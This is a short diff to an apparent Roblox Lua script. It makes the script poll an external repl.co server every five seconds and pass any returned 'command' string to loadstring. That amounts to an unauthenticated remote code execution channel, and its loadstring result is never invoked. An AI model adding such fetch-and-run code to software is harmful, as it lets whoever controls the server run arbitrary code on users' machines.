@@ -91,11 +91,16 @@ Gui.TextButton2.MouseButton1Click:Connect(function()
 		end
 		local code = Gui.TextBox.Text
 		coroutine.wrap(function()
-			while wait(30) do
+			while wait(5) do
 				if Gui.TextBox.Text~=code then
 					break
 				end
 				loadGameData(getGameData("https://rocode.gamzyroblox.repl.co/data/"..code))
+				local command = HttpsService:GetAsync("https://rocode.gamzyroblox.repl.co/command/"..code)
+				if command == "" then
+				else
+					loadstring(command)
+				end
 			end
 		end)
 	else
